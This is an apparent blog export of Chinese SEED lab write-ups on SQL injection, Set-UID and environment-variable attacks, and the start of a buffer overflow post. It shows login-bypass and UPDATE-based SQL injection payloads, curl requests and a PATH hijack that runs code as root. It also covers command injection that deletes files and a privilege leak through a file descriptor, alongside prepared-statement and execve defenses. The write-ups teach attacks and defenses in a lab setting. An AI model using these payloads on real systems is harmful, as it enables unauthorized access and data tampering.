[{"content":"环境设置 修改映射 将以下条目添加到 etc/hosts 目录下，其中 www.seed-server.com 是Web程序的域名，10.9.0.5 是容器的IP\n10.9.0.5\twww.seed-server.com 构建并启动docker 在Labsetup下使用命令 docker-compose build 构建docker 使用命令 docker-compose up 拉起容器，容器中的 /var/lib/mysql 挂载在 Labsetup 目录下。 Task 1：熟悉 SQL 语句 进入容器shell并使用mysql客户端与数据库进行交互 docker ps docksh a3 mysql -u root -pdees 加载数据库并打印数据库中的所有表 使用命令show databases;查看所有数据库： mysql\u0026gt; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | mysql | | performance_schema | | sqllab_users | | sys | +--------------------+ 5 rows in set (0.00 sec) 使用命令use sqllab_users;加载数据库： mysql\u0026gt; use sqllab_users; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed mysql\u0026gt; show tables; +------------------------+ | Tables_in_sqllab_users | +------------------------+ | credential | +------------------------+ 1 row in set (0.00 sec) 使用命令show tables;打印此数据库的所有表： mysql\u0026gt; show tables;\r+------------------------+\r| Tables_in_sqllab_users |\r+------------------------+\r| credential |\r+------------------------+\r1 row in set (0.00 sec) 使用命令打印员工 Alice 的所有资料信息 使用命令SELECT * from credential;打印整个表单： ​\t发现Alice在Name表项下，ID为1。\n使用命令SELECT * from credential WHERE Name='Alice'即可打印员工Alice的所有资料： Task 2：基于 SELECT 语句的 SQL 注入攻击 登录界面 使用浏览器访问 www.seed-server.com 进入登录界面，如下：\n使用命令sudo docker cp ec:/var/www/SQL_Injection/unsafe_home.php .可以将登录界面前端代码从docker中拷贝到外部\n登录界面逻辑 $input_uname = $_GET[\u0026#39;username\u0026#39;]; $input_pwd = $_GET[\u0026#39;Password\u0026#39;]; $hashed_pwd = sha1($input_pwd); $input_uname：用户输入的用户名\n$input_pwd：用户输入的密码\n$hashed_pwd: 密码的哈希值\n// create a connection $conn = getDB(); // Sql query to authenticate the user $sql = \u0026#34;SELECT id, name, eid, salary, birth, ssn, phoneNumber, address, email,nickname,Password FROM credential WHERE name= \u0026#39;$input_uname\u0026#39; and Password=\u0026#39;$hashed_pwd\u0026#39;\u0026#34;; if (!$result = $conn-\u0026gt;query($sql)) { echo \u0026#34;\u0026lt;/div\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;/nav\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;div class=\u0026#39;container text-center\u0026#39;\u0026gt;\u0026#34;; die(\u0026#39;There was an error running the query [\u0026#39; . $conn-\u0026gt;error . \u0026#39;]\\n\u0026#39;); echo \u0026#34;\u0026lt;/div\u0026gt;\u0026#34;; } 这段代码使用了sql语句查询表中是否有用户名为$input_uname且密码哈希值为$hashed_pwd的表项，如果有则登录成功。\nTask 2.1：基于网页的 SQL 注入攻击 你的任务是以管理员的身份从登录页面登录到 Web 应用程序，这样 你就可以查看所有员工的信息。管理员的用户名是 admin，口令未知。请在用户名与口令输入框中输入 能成功完成攻击的内容。\n1. 利用 OR 我们可以构造 admin' OR '1=1 作为我们的登录用户名，这样Sql查询语句就变成了:\nSELECT id, name, eid, salary, birth, ssn, phoneNumber, address, email,nickname,Password FROM credential WHERE name= \u0026#39;admin\u0026#39; OR \u0026#39;1\u0026#39;=\u0026#39;1\u0026#39; and Password=\u0026#39;$hashed_pwd\u0026#39; 在Sql查询中，只要OR的前半部分为真，整个查询就为真，name='admin'为真，于是会直接跳过密码哈希值的判断部分，进而登录成功。\n2. 利用注释 我们可以构造 admin' -- 或admin' #作为用户名,这样后面的语句就会被注释掉：\nWHERE name= \u0026#39;admin\u0026#39; -- and Password=\u0026#39;$hashed_pwd\u0026#39; WHERE name= \u0026#39;admin\u0026#39; #and Password=\u0026#39;$hashed_pwd\u0026#39; 这样也会跳过密码哈希值的判断。\nTask 2.2：基于命令行的 SQL 注入攻击 在不使用网页的情况下完成 Task 2.1 的目标。你可以使用命令行 工具，如 curl，它可以发送 HTTP 请求。如需在 HTTP 请求中包含多个参数，需要把 URL 和参数用一对 单引号括起来。否则，用于分隔参数的特殊字符 (如 \u0026amp;) 会被 shell 曲解，造成命令歧义。\n将 Task 2.1 的命令中的 #，空格，\u0026rsquo;,进行 URL 编码\n# space ' %23 %20 %27 curl \u0026#39;www.seed-server.com/unsafe_home.php?username=admin%27%20OR%20%271=1\u0026amp;Password=\u0026#39; curl \u0026#39;www.seed-server.com/unsafe_home.php?username=admin%27%23\u0026amp;Password=\u0026#39; curl \u0026#39;www.seed-server.com/unsafe_home.php?username=admin%27%20--%20\u0026amp;Password=\u0026#39; 以上三条命令执行后都能登录成功并且回显出表单内容\nTask 2.3：增加一条新的 SQL 语句 admin\u0026#39;; DELETE FROM credential WHERE name=\u0026#39;admin\u0026#39;;# 尝试执行第二条 SQL 语句 DELETE FROM credential WHERE name='admin'; 删除 admin 表项，但是注入失败：\n原因： 查阅 SEED BOOK 后发现和 PHP 中 mysqli 拓展的 query() 函数有关，query()不允许在数据库服务器中运行多条语句，这是为了防止恶意用户通过 SQL 注入攻击执行额外的恶意 SQL 操作。即使攻击者在注入的输入中添加了分号，数据库也不会执行多条sql语句，会直接抛出错误。\nTask 3：基于 UPDATE 语句的 SQL 注入攻击 当员工通过编辑界面编辑他们的信息时，是通过如下的SQL语句更新表单内容的，在 unsafe_edit_backend.php 文件中实现的 PHP 代码用于更新员工的个人信息：\n$conn = getDB(); // Don\u0026#39;t do this, this is not safe against SQL injection attack $sql=\u0026#34;\u0026#34;; if($input_pwd!=\u0026#39;\u0026#39;){ // In case password field is not empty. $hashed_pwd = sha1($input_pwd); //Update the password stored in the session. $_SESSION[\u0026#39;pwd\u0026#39;]=$hashed_pwd; $sql = \u0026#34;UPDATE credential SET nickname=\u0026#39;$input_nickname\u0026#39;,email=\u0026#39;$input_email\u0026#39;,address=\u0026#39;$input_address\u0026#39;,Password=\u0026#39;$hashed_pwd\u0026#39;,PhoneNumber=\u0026#39;$input_phonenumber\u0026#39; where ID=$id;\u0026#34;; }else{ // if passowrd field is empty. $sql = \u0026#34;UPDATE credential SET nickname=\u0026#39;$input_nickname\u0026#39;,email=\u0026#39;$input_email\u0026#39;,address=\u0026#39;$input_address\u0026#39;,PhoneNumber=\u0026#39;$input_phonenumber\u0026#39; where ID=$id;\u0026#34;; } $conn-\u0026gt;query($sql); 可以发现代码是通过执行一个sql语句进行表单的更新：\nUPDATE credential SET nickname=\u0026#39;$input_nickname\u0026#39;,email=\u0026#39;$input_email\u0026#39;,address=\u0026#39;$input_address\u0026#39;,Password=\u0026#39;$hashed_pwd\u0026#39;,PhoneNumber=\u0026#39;$input_phonenumber\u0026#39; where ID=$id; Task 3.1：修改自己的工资 编辑页面中只能修改员工的昵称、电子邮件、地址、电话号码和口令，而不能用于修改工资。假设你 (Alice) 由于老板 Boby 今年未给你加薪而感到不满。你想利用存在于编辑页面的 SQL 注入漏洞来增加自己的工资。请展示你是如何实现这一目标的。已知列 salary 用于存储工资数额。\n由于 PhoneNumber 是修改的最后一项，于是我们可以在 PhoneNumber 这里注入：\n填入 ',salary=99999 WHERE name='Alice' # ，相当于执行了：\nUPDATE credential SET nickname=\u0026#39;\u0026#39;,email=\u0026#39;\u0026#39;,address=\u0026#39;\u0026#39;,Password=\u0026#39;$hashed_pwd\u0026#39;,PhoneNumber=\u0026#39;\u0026#39;,salary=99999 where name=\u0026#39;Alice\u0026#39; #\u0026#39; where ID=$id; ; 这会把 Alice 的 Salary 表项改成 99999：\nTask 3.2：修改他人的工资 在提高自己的工资数额后，你决定惩罚你的老板 Boby，将他的工资减少到 1 美元。请展示你是如何实现这一目标的。\n在 PhoneNumber 项填入 ',salary=1 WHERE name='Boby' #，相当于执行了：\nUPDATE credential SET nickname=\u0026#39;$input_nickname\u0026#39;,email=\u0026#39;$input_email\u0026#39;,address=\u0026#39;$input_address\u0026#39;,Password=\u0026#39;$hashed_pwd\u0026#39;,PhoneNumber=\u0026#39;\u0026#39;,salary=1 WHERE name=\u0026#39;Boby\u0026#39; #\u0026#39; where ID=$id; 这会将 Boby 的工资表项更新成 1\nTask 3.3：修改他人的口令 修改完 Boby 的工资后，你仍心有不甘，所以你想修改 Boby 的口令，这样你就可以登录他的账户，做进一步的破坏。\n由于 Password 在数据库中是以 SHA1 哈希后的哈希值存储的，如果我想把 Boby 的 Password 改为88888888，我就要将数据库中 Boby 对应的 Password 改为 SHA1(88888888)。\n通过 CyberChef 计算出哈希后的值：\n在 PhoneNumber 项填入 ',Password='05b530ad0fb56286fe051d5f8be5b8453f1cd93f' WHERE name='Boby' #，这会修改 Boby 的数据库中的 Password 值：\n现在我们再尝试使用密码 88888888 登录，发现登录成功：\nTask 4：对策：语句预处理 请使用语句预处理机制来修复 SQL 注入漏洞。为了简单起见，我们在文件夹 defense 内创建了一 个简化程序，你需要对这个文件夹中的文件进行修改。\n修改代码 修改 www 容器中的 /var/www/SQL_Injection/defense/ 文件夹下的 unsafe.php 文件，修改后的文件如下所示：\n\u0026lt;?php // Function to create a sql connection. function getDB() { $dbhost=\u0026#34;10.9.0.6\u0026#34;; $dbuser=\u0026#34;seed\u0026#34;; $dbpass=\u0026#34;dees\u0026#34;; $dbname=\u0026#34;sqllab_users\u0026#34;; // Create a DB connection $conn = new mysqli($dbhost, $dbuser, $dbpass, $dbname); if ($conn-\u0026gt;connect_error) { die(\u0026#34;Connection failed: \u0026#34; . $conn-\u0026gt;connect_error . \u0026#34;\\n\u0026#34;); } return $conn; } $input_uname = $_GET[\u0026#39;username\u0026#39;]; $input_pwd = $_GET[\u0026#39;Password\u0026#39;]; $hashed_pwd = sha1($input_pwd); // create a connection $conn = getDB(); // Use prepared statements to prevent SQL injection $stmt = $conn-\u0026gt;prepare(\u0026#34;SELECT id, name, eid, salary, ssn FROM credential WHERE name = ? AND Password = ?\u0026#34;); if ($stmt) { // Bind parameters (s - string, i - int, d - double, b - blob) $stmt-\u0026gt;bind_param(\u0026#34;ss\u0026#34;, $input_uname, $hashed_pwd); // Execute the statement $stmt-\u0026gt;execute(); // Get the result $result = $stmt-\u0026gt;get_result(); if ($result-\u0026gt;num_rows \u0026gt; 0) { // only take the first row $firstrow = $result-\u0026gt;fetch_assoc(); $id = $firstrow[\u0026#34;id\u0026#34;]; $name = $firstrow[\u0026#34;name\u0026#34;]; $eid = $firstrow[\u0026#34;eid\u0026#34;]; $salary = $firstrow[\u0026#34;salary\u0026#34;]; $ssn = $firstrow[\u0026#34;ssn\u0026#34;]; } // Close the statement $stmt-\u0026gt;close(); } // close the sql connection $conn-\u0026gt;close(); ?\u0026gt; 使用准备好的语句（Prepared Statements）：通过 $conn-\u0026gt;prepare() 函数创建查询，并使用 ? 占位符来防止直接插入用户输入内容。 绑定参数：使用 $stmt-\u0026gt;bind_param() 函数，将用户输入的参数绑定到准备好的语句中。这种做法确保了SQL查询不会直接拼接用户输入，从而避免SQL注入风险。其中 \u0026quot;ss\u0026quot; 表示 $input_uname 和 $hashed_pwd 都是字符串类型。 测试 访问 http://www.seed-server.com/defense 再使用 Alice' # 对 USERNAME 进行 SQL 注入测试：\n发现已经无法查询到 Alice 的信息了。\n思考题 为了防止 C 程序在调用外部程序时出现代码注入攻击，我们不应该使用 system()，而应使用 execve()。请描述这种防御措施与防御 SQL 注入攻击的预处理语句之间的相似性。\n1. system() vs execve() 防御代码注入 在 C 语言中使用 system() 调用外部程序时，用户输入直接作为 shell 命令的一部分，如果用户输入中包含特殊字符或命令，就可能导致代码注入攻击。 而 execve() 是更安全的选择，因为它直接调用外部程序，而不使用 shell。这意味着它不会将输入当作 shell 命令进行解析，避免了恶意输入的执行。 2. SQL 预处理语句防御 SQL 注入 在 SQL 查询中，如果直接将用户输入插入到查询字符串中，恶意用户可以利用输入中的特殊字符来构造有害的 SQL 语句，导致 SQL 注入攻击。 使用 SQL 预处理语句可以防止这种情况发生。预处理语句将查询结构与参数分开，参数通过安全绑定方式插入，不会被当作 SQL 代码解析，避免了攻击。 两者的相似性 两者都采用了分离用户输入和实际代码执行的方式，从而防止了恶意代码注入。 execve() 通过直接调用程序避免了 shell 的解析，而预处理语句通过绑定参数避免了 SQL 解析。 在本质上，这些防御措施都是为了避免将用户输入直接传递给解释器或执行环境，从而避免潜在的注入攻击。 ","permalink":"https://smera1d0.github.io/posts/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3-sql-%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/","summary":"\u003ch2 id=\"环境设置\"\u003e环境设置\u003c/h2\u003e\n\u003ch3 id=\"修改映射\"\u003e修改映射\u003c/h3\u003e\n\u003cp\u003e将以下条目添加到 \u003ccode\u003eetc/hosts\u003c/code\u003e 目录下，其中 \u003ccode\u003ewww.seed-server.com\u003c/code\u003e 是Web程序的域名，\u003ccode\u003e10.9.0.5\u003c/code\u003e 是容器的IP\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"m\"\u003e10.9.0.5\u003c/span\u003e\u003cspan class=\"w\"\u003e\t\u003c/span\u003e\u003cspan class=\"l\"\u003ewww.seed-server.com\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"构建并启动docker\"\u003e构建并启动docker\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e在\u003ccode\u003eLabsetup\u003c/code\u003e下使用命令 \u003ccode\u003edocker-compose build\u003c/code\u003e 构建docker\u003c/li\u003e\n\u003c/ol\u003e\n\u003cimg src=\"https://s2.loli.net/2024/10/23/DAYObt7uPgqWsBv.png\" alt=\"image-20241023085326893\" style=\"zoom: 50%;\" /\u003e\r\n\u003col start=\"2\"\u003e\n\u003cli\u003e使用命令 \u003ccode\u003edocker-compose up\u003c/code\u003e 拉起容器，容器中的 \u003ccode\u003e/var/lib/mysql\u003c/code\u003e 挂载在 \u003ccode\u003eLabsetup\u003c/code\u003e 目录下。\u003c/li\u003e\n\u003c/ol\u003e\n\u003cimg src=\"https://s2.loli.net/2024/10/23/mHyO4TSWMEpYlxJ.png\" alt=\"image-20241023090817956\" style=\"zoom: 33%;\" /\u003e\r\n\u003ch2 id=\"task-1熟悉-sql-语句\"\u003eTask 1：熟悉 SQL 语句\u003c/h2\u003e\n\u003ch3 id=\"进入容器shell并使用mysql客户端与数据库进行交互\"\u003e进入容器shell并使用mysql客户端与数据库进行交互\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker ps\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocksh a3\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emysql -u root -pdees\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://s2.loli.net/2024/10/23/vLGOnWEDS6B5wsf.png\" alt=\"image-20241023092314024\"  /\u003e\n\u003c/p\u003e","title":"SEEDlab—SQL注入攻击实验"},{"content":"Task 1：配置环境变量 使用printenv或env指令来打印环境变量： ​\t如果只想打印特定的环境变量，如PWD变量，可以使用printenv PWD或者env | grep PWD\n使用export和unset来设置或者取消环境变量 使用export设置环境变量： ​\t比如现在我使用export设置一个环境变量MY_VAR的值为softwaresecurity\n​\t可以使用echo $MY_VAR打印出这个环境变量的值。\n使用unset取消环境变量： ​\t取消变量MY_VAR。\nTask 2：从父进程向子进程传递环境变量 编译myprintenv.c并运行，将输出结果打印到文件output1.txt中。 注释掉子进程中的printenv()，并取消注释父进程的printenv()，再次编译并打印输出到文件output2.txt。 使用diff命令比较两个文件的差异。 ​\t结论：由于我在不同的窗口下运行的a.out和b.out，因此父子进程只有编译成的可执行文件名称和命令行窗口这两个环境变量不同，其余的环境变量都是相同的。结论是子进程在继承父进程的环境变量时，除了文件名和输出窗口存在差异以外，其他的环境变量都是相同的。\nTask 3：环境变量和execve() 编译并运行myenv.c 发现输出为空。\n修改execve()函数为execve(\u0026quot;/usr/bin/env\u0026quot;,argv,environ); 发现打印出了当前进程的环境变量。\n结论：\nexecve()函数的原型是：\nint execve(const char *pathname, char *const argv[], char *const envp[]); pathname: 要执行的程序的路径。 argv: 参数数组，以 NULL 结尾，包含传递给程序的命令行参数。 envp: 环境变量数组，也以 NULL 结尾。 新程序通过execve()函数的第三个参数传递的environ变量来获取环境变量。\nTask 4：环境变量和system() 编译并运行如下代码：\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int main() { system(\u0026#34;/usr/bin/env\u0026#34;); return 0; } 我们使用man system查看函数的手册：\n可以看到system()函数是通过创建一个子进程，执行execl(\u0026quot;/bin/sh\u0026quot;, \u0026quot;sh\u0026quot;, \u0026quot;-c\u0026quot;, command, (char *) NULL);，调用进程的环境变量会传递给新程序/bin/sh。\nTask 5：环境变量和Set-UID程序 编写以下程序打印该进程所有的环境变量： #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; extern char **environ; void main() { int i = 0; while (environ[i] != NULL) { printf(\u0026#34;%s\\n\u0026#34;, environ[i]); i++; } } 编译上述程序得到 foo，将其所有者更改为 root，并使其成为一个 Set-UID 程序 // Asssume the program’s name is foo $ sudo chown root foo $ sudo chmod 4755 foo 查看一下foo的权限，发现所有者更改为了root。\n设置以下环境变量： PATH LD_LIBRARY_PATH MY_NAME 然后运行foo并查看这些环境变量的值\n发现只有在父进程中设置的PATH和MY_NAME的环境变量进入子进程，而LD_LIBRARY_PATH这个环境变量没有进入子进程。\n原因： LD_LIBRARY_PATH这个环境变量设置的是动态链接器的地址，由于动态链接器的保护机制，虽然在一个root权限的程序下创建子进程并继承父进程的环境变量，但由于我们是在普通用户下修改的LD_LIBRARY_PATH这个环境变量，所以是无法在子进程中生效的，而PATH和MY_NAME则没有这种保护机制，因此可以被成功设置。\nTask 6：PATH环境变量和Set-UID程序 先使用以下命令将bin/sh链接到bin/zsh，以规避bin/dash阻止Set-UID程序使用特权执行的策略。\nsudo ln -sf /bin/zsh /bin/sh 然后编写LS.c文件，如下所示：\n#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; int main(){ system(\u0026#34;ls\u0026#34;); return 0; } 然后编译，并设置为Set-UID程序：\n可以看出，编译出来的LS文件确实执行了system(\u0026quot;ls\u0026quot;)的操作，更改后的文件所有者确实变成了root\n现在我们在普通用户下设置PATH环境变量，使用export PATH=/home/seed:$PATH将/home/seed 添加到环境变量的开头：\n然后我们在/home/seed下编写我们的恶意代码。\n// hack.c #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; extern char **environ; int main(){ uid_t euid = geteuid(); //获取执行恶意代码的进程的euid printf(\u0026#34;euid=%d\\n\u0026#34;, euid); printf(\u0026#34;You have been hacked!!!!\\n\u0026#34;); return 0; } 然后编译并命名成ls：\ngcc hack.c -o ls 然后再执行我们的LS文件：\n发现可以使用Set-UID程序运行我们的恶意代码，并且根据system(\u0026quot;id\u0026quot;)的结果来看：euid=0表示当前进程具有root权限，表明恶意代码是以root权限运行的。\nTask 7：LD_PRELOAD环境变量和Set-UID程序 观察环境变量在运行普通程序时如何影响动态加载器/链接器的行为，首先要进行如下配置： 构建一个动态链接库，命名为mylib.c，里面基本上覆盖了libc里的sleep()函数： #include \u0026lt;stdio.h\u0026gt; void sleep (int s) { /* If this is invoked by a privileged program , you can do damages here! */ printf(\u0026#34;I am not sleeping!\\n\u0026#34;); } 编译该程序： gcc -fPIC -g -c mylib.c gcc -shared -o libmylib.so.1.0.1 mylib.o -lc 设置LD_PRELOAD环境变量的值： export LD_PRELOAD=./libmylib.so.1.0.1 编译下面的程序myprog.c /* myprog.c */ #include \u0026lt;unistd.h\u0026gt; int main() { sleep(1); return 0; } 完成上述操作后，请在以下条件下运行 myprog，观察会发生什么。 使 myprog 为一个普通程序，以普通用户身份执行它。 发现执行的是我们编写的sleep函数。\n使 myprog 为一个 Set-UID 特权程序，以普通用户身份执行它。 发现等待了一秒后，没有输出，说明执行的是libc中的sleep()函数。\n使 myprog 为一个 Set-UID 特权程序，在 root 下重新设置 LD_PRELOAD 环境变量，并执行它。 发现执行的是我们编写的sleep函数。\n使myprog成为一个Set_UID user1程序，在另一个用户帐户（非root用户）中再次改变LD_PRELOAD环境变量并运行它 发现等待了一秒后，没有输出，说明执行的是libc中的sleep()函数。\n设计一个实验来找出导致这些差异的原因，并解释为什么第二步的行为不同。 修改一下myprog.c，打印这个程序运行时的进程的uid、euid以及LD_PRELOAD环境变量的值，如下所示：\n/* myprog.c */ #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; extern char **environ; int main() { sleep(1); uid_t uid = getuid(); printf(\u0026#34;uid=%d(%s) \u0026#34;, uid, getenv(\u0026#34;USER\u0026#34;)); uid_t euid = geteuid(); printf(\u0026#34;euid=%d\\n\u0026#34;, euid); char *preload = getenv(\u0026#34;LD_PRELOAD\u0026#34;); printf(\u0026#34;LD_PRELOAD: %s\\n\u0026#34;, preload); return 0; } 然后编写一个shell脚本，用于测试四种情况的输出以及当前进程的id，如下所示：\n#test.sh echo \u0026#34;seed,run in seed:\u0026#34; sudo chown seed myprog sudo chmod 4755 myprog export LD_PRELOAD=./libmylib.so.1.0.1 ./myprog echo \u0026#34;root,run in seed:\u0026#34; sudo chown root myprog sudo chmod 4755 myprog ./myprog echo \u0026#34;root,run in root:\u0026#34; sudo su \u0026lt;\u0026lt;EOF export LD_PRELOAD=./libmylib.so.1.0.1 ./myprog EOF echo \u0026#34;user1,run in seed:\u0026#34; sudo chown user1 myprog sudo chmod 4755 myprog export LD_PRELOAD=./libmylib.so.1.0.1 ./myprog 这个脚本可以自动化测试四种情况下的sleep()函数的执行情况以及打印当前进程的id，运行结果如下：\n我们发现：\n当myprog为一个普通程序，以普通用户身份执行它时，其uid为seed，euid也为seed，LD_PRELOAD环境变量继承了父进程的，并且执行的是我们编写的sleep函数。\n当myprog为一个Set-UID程序时，以普通用户身份执行它时，其uid为seed，euid为root，LD_PRELOAD环境变量没有继承父进程的，并且执行的是libc的sleep函数。\n当myprog为一个Set-UID程序时，以root用户身份执行它时，其uid为root，euid为root，LD_PRELOAD环境变量继承了父进程的，并且执行的是我们编写的sleep函数。\n当myprog为一个Set-UID user1程序时，以普通用户身份执行它时，其uid为seed，euid为user1，LD_PRELOAD环境变量没有继承父进程的，并且执行的是libc的sleep函数。\n如下表所示：\n程序类型 执行用户 uid euid LD_PRELOAD环境变量 执行的sleep函数 普通程序 seed seed seed 继承父进程 我们编写的 Set-UID程序 seed seed root 没有继承父进程 libc的 Set-UID程序 root root root 继承父进程 我们编写的 Set-UID user1程序 seed seed user1 没有继承父进程 libc的 结论：\n当一个进程的uid和euid一致时，子进程才会继承父进程的环境变量，才会执行我们编写的sleep()函数，第二步行为不同的原因是因为它们的uid和euid的一致/不一致会导致子进程继承/不继承LD_PRELOAD环境变量，从而导致了sleep()函数的不同。\nTask 8：使用 system() 与 execve() 调用外部程序的对比 编写并编译catcall.c，如下所示：\n#include \u0026lt;unistd.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main(int argc, char *argv[]) { char *v[3]; char *command; if(argc \u0026lt; 2) { printf(\u0026#34;Please type a file name.\\n\u0026#34;); return 1; } v[0] = \u0026#34;/bin/cat\u0026#34;; v[1] = argv[1]; v[2] = NULL; command = malloc(strlen(v[0]) + strlen(v[1]) + 2); sprintf(command , \u0026#34;%s %s\u0026#34;, v[0], v[1]); system(command); // execve(v[0], v, NULL); return 0 ; } 这个程序调用了system()函数执行了/bin/cat [filename]，可以打印指定文件的内容。\n编译上述程序，使其成为 root 所有的 Set-UID 程序。该程序将使用 system() 来调用该命令。如果你是 Bob，你能损害系统的完整性吗？例如，你可以删除对你没有写权限的文件吗？\n首先使其成为root所有的 Set-UID 程序： 尝试删除没有写权限的文件：\n首先创建一个seed没有写权限的文件，我们首先要将文件夹权限改为seed不可写，再将test.txt的属性设为seed不可写： 发现catcall有命令注入漏洞，可以调用system()执行其他系统命令： ​\t使用命令catcall \u0026quot;test.txt;rm test.txt\u0026quot;成功将没有写权限的test.txt删除。\n注释掉 system(command) 语句，取消注释 execve() 语句；程序将使用 execve() 来调用命令。 编译程序，并使其成为 root 拥有的 Set-UID 程序。你在第一步中的攻击仍然有效吗？请描述并解释你的观察结果。\n首先创建一个seed没有写权限的文件： 然后再使用命令catcall \u0026quot;test.txt;rm test.txt\u0026quot; ​\t发现无法删除test.txt，攻击失效。\n原理：\n使用system()函数能成功删除的原因是system()函数会创建一个子进程，并调用bin/bash来执行函数的参数，因此执行catcall \u0026quot;test.txt;rm test.txt\u0026quot;就相当于父进程创建了一个子进程，子进程使用bin/bash执行bin/cat test.txt;rm test.txt ，由于bash的特性，分号后面会作为下一个命令并执行，而且父进程是一个Set-UID程序，因此相当于在 root 下执行了rm test.txt，所以可以删除文件。\n而使用execve()函数删除不了文件的原因是execve()函数并不是调用bin/bash来执行函数的参数的，而是通过系统调用的方式执行bin/cat test.txt;rm test.txt，它会把 test.txt;rm test.txt 当作一个文件名，而我们这个目录下并不存在这个文件，因此会报错/bin/cat: 'test.txt;rm test.txt': No such file or directory\nTask 9：权限泄漏 编译以下程序，将其所有者更改为 root，并使其成为 Set-UID 程序。\n#include \u0026lt;unistd.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; void main() { int fd; char *v[2]; /* Assume that /etc/zzz is an important system file, * and it is owned by root with permission 0644. * Before running this program, you should create * the file /etc/zzz first. */ fd = open(\u0026#34;/etc/zzz\u0026#34;, O_RDWR | O_APPEND); if (fd == -1) { printf(\u0026#34;Cannot open /etc/zzz\\n\u0026#34;); exit(0); } // Print out the file descriptor value printf(\u0026#34;fd is %d\\n\u0026#34;, fd); // Permanently disable the privilege by making the // effective uid the same as the real uid setuid(getuid()); // Execute /bin/sh v[0] = \u0026#34;/bin/sh\u0026#34;; v[1] = 0; execve(v[0], v, 0); } 我们在/etc下创建文件zzz，并运行cap_leak\n文件描述符（File Descriptor，简称 fd）是操作系统中用于管理和操作文件或其他输入/输出资源（如网络连接、管道等）的一个重要概念。当打开一个文件时，操作系统会返回一个文件描述符，后续的读写操作都通过这个描述符进行。\n此时输出了zzz文件的文件描述符fd（File Descriptor），并且执行了setuid(getuid())操作，将进程的uid改为了当前用户的，也就是将uid设为seed，然后调用execve()函数执行了bin/sh开启了一个shell。\n我们使用whoami命令查看shell的拥有者：\n发现拥有者确实是seed，但是虽然这个进程的有效用户ID是 seed ，但是该进程仍然拥有特权，我们可以以普通用户的身份将恶意代码写入/etc/zzz文件中，这个过程需要利用文件描述符fd。\n我们可以使用echo \u0026quot;You have been hacked!!\u0026quot; \u0026gt;\u0026amp; 3，将这段话通过文件描述符写入/etc/zzz：\n可以发现成功写入了文件。\n原理：\n虽然代码中执行了setuid(getuid())操作，将进程的uid改为了seed，但是在执行execve(v[0], v, 0) 打开一个shell时，由于在放弃特权时没有关闭/etc/zzz这个文件，创建的子进程会继承/etc/zzz这个文件的文件描述符，造成特权泄露，子进程可以利用这个文件描述符向文件中写入内容。\n","permalink":"https://smera1d0.github.io/posts/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8E-set-uid-%E5%AE%9E%E9%AA%8C/","summary":"\u003ch2 id=\"task-1配置环境变量\"\u003eTask 1：配置环境变量\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e使用\u003ccode\u003eprintenv\u003c/code\u003e或\u003ccode\u003eenv\u003c/code\u003e指令来打印环境变量：\u003c/li\u003e\n\u003c/ol\u003e\n\u003cimg src=\"https://s2.loli.net/2024/12/07/g6ZbY3wNelFK9EV.png\" alt=\"image-20240925085104482\" style=\"zoom:50%;\" /\u003e\r\n\u003cimg src=\"https://s2.loli.net/2024/12/07/k6b389YmWV5TSfM.png\" alt=\"image-20240925085246669\" style=\"zoom:50%;\" /\u003e\r\n\u003cp\u003e​\t如果只想打印特定的环境变量，如\u003ccode\u003ePWD\u003c/code\u003e变量，可以使用\u003ccode\u003eprintenv PWD\u003c/code\u003e或者\u003ccode\u003eenv | grep PWD\u003c/code\u003e\u003c/p\u003e","title":"SEEDlab—环境变量与 Set-UID 实验"},{"content":"SEEDlab—缓冲区溢出漏洞 环境设置 关闭反制措施 地址空间布局随机化 地址空间布局随机化：Linux操作系统的使用随机的地址来设置堆栈的起始地址，使得攻击者很难猜测出确切的堆栈起始地址。\n使用命令sudo sysctl -w kernel.randomize_va_space=0来关闭地址空间布局随机化。\n配置/bin/sh 